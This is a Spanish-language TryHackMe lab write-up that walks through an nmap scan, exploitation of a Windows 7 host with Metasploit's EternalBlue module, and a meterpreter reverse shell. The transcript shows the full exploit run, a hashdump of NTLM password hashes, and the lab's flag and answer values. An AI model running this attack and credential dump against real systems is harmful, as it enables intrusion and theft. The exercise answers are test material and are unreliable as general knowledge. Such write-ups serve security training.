---
tags:
  - Metasploit
  - Eternal_blue
---
# El apartado de este writeUP es:
---
# [Apartado](obsidian://open?vault=Google%20drive-Odsidian&file=Ciberseguridad%2FTHM%2FFundamentos%20de%20la%20explotaci%C3%B3n%2FMetasploit%20Explotaci%C3%B3n%2FExplotaci%C3%B3n)

---

<Primero que nada vamos a hacer un escaneo a la IP (En mi caso: 10.10.41.201) haciendo y synscan y que nos diga la versión de las cosas.
```shell-session important=9
root@ip-10-10-153-130:~# nmap -sS -sV 10.10.41.201
Starting Nmap 7.80 ( https://nmap.org ) at 2025-06-02 17:55 BST
Nmap scan report for 10.10.41.201
Host is up (0.00071s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
MAC Address: 02:7F:1D:FB:B9:AF (Unknown)
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 67.98 seconds
```

Aquí nos damos cuenta que esto lo más seguro es que sea un servidor de Windows vulnerable a [eternalblue](), vamos a probarlo con la herramienta *Metasploit*.
```shell
root@ip-10-10-153-130:~# msfconsole

msf6 > search eternalblue

Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1     \_ target: Automatic Target                  .                .        .      .
   2     \_ target: Windows 7                         .                .        .      .
   3     \_ target: Windows Embedded Standard 7       .                .        .      .
[...]
   27  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
   28    \_ target: Execute payload (x64)             .                .        .      .
   29    \_ target: Neutralize implant                .                .        .      .


Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce
After interacting with a module you can manually set a TARGET with set TARGET 'Neutralize implant'

msf6 > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RhOSTS 10.10.41.201
RhOSTS => 10.10.41.201
msf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads

Compatible Payloads
===================

   #   Name                                                Disclosure Date  Rank    Check  Description
   -   ----                                                ---------------  ----    -----  -----------
   0   payload/generic/custom                              .                normal  No     Custom Payload
   1   payload/generic/shell_bind_aws_ssm                  .                normal  No     Command Shell, Bind SSM (via AWS API)
   2   payload/generic/shell_bind_tcp                      .                normal  No     Generic Command Shell, Bind TCP Inline
   3   payload/generic/shell_reverse_tcp                   .                normal  No     Generic Command Shell, Reverse TCP Inline
  [...]
   72  payload/windows/x64/vncinject/reverse_winhttp       .                normal  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTP Stager (winhttp)
   73  payload/windows/x64/vncinject/reverse_winhttps      .                normal  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTPS Stager (winhttp)

msf6 exploit(windows/smb/ms17_010_eternalblue) > use 0
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblu...]e):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.10.41.201     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.htm
                                             l
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows
                                              7, Windows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7,
                                             Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Em
                                             bedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.153.130    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.
```

Ya que tenemos todos los datos, vamos a probar si funciona o no.

```sh imp=28-30
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
[*] Started reverse TCP handler on 10.10.153.130:4444 
[*] 10.10.41.201:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.41.201:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.41.201:445      - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.41.201:445 - The target is vulnerable.
[*] 10.10.41.201:445 - Connecting to target for exploitation.
[+] 10.10.41.201:445 - Connection established for exploitation.
[+] 10.10.41.201:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.41.201:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.41.201:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.41.201:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.41.201:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.41.201:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.41.201:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.41.201:445 - Sending all but last fragment of exploit packet
[*] 10.10.41.201:445 - Starting non-paged pool grooming
[+] 10.10.41.201:445 - Sending SMBv2 buffers
[+] 10.10.41.201:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.41.201:445 - Sending final SMBv2 buffers.
[*] 10.10.41.201:445 - Sending last fragment of exploit packet!
[*] 10.10.41.201:445 - Receiving response from exploit packet
[+] 10.10.41.201:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.41.201:445 - Sending egg to corrupted connection.
[*] 10.10.41.201:445 - Triggering free of corrupted buffer.
[*] Sending stage (203846 bytes) to 10.10.41.201
[*] Meterpreter session 1 opened (10.10.153.130:4444 -> 10.10.41.201:49187) at 2025-06-02 18:01:28 +0100
[+] 10.10.41.201:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.41.201:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.41.201:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
```

¡Ganamos acceso!, ahora vamos a buscar la flag

```sh imp=7,10
meterpreter > search -f flag.txt
Found 1 result...
=================

Path                             Size (bytes)  Modified (UTC)
----                             ------------  --------------
c:\Users\Jon\Documents\flag.txt  15            2021-07-15 03:39:25 +0100

meterpreter > cat C:\\Users\\Jon\\Documents\\flag.txt 
THM-5455554845
```

Y ya conseguimos la primera flag

Para la segunda `What is the NTLM hash of the password of the user "pirate"?`, para ello lo más fácil es hacer un **hashdump**.
```sh imp=4
meterpreter > hashdump 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
pirate:1001:aad3b435b51404eeaad3b435b51404ee:8ce9a3ebd1647fcc5e04025019f4b875:::
```

La parte importante de aquí es: `8ce9a3ebd1647fcc5e04025019f4b875`
